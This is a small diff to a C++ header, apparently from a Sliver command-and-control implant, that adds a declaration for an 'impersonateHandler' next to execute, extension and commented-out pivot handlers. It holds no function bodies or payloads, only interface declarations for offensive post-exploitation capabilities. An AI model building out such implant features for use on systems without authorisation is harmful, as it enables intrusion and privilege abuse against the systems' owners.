@@ -30,7 +30,7 @@ namespace handlers {
 	sliverpb::Envelope callExtensionHandler(int64_t, string);
 	sliverpb::Envelope listExtensionHandler(int64_t, string);
 	sliverpb::Envelope executeHandler(int64_t, string);
-
+	sliverpb::Envelope impersonateHandler(int64_t taskID, string data);
 	//pivot handlers
 	//map<int, pivotHandler>& getPivotHandlers();
 	/*sliverpb::Envelope pivotStartListenerHandler(sliverpb::Envelope, shared_ptr<Connection>);
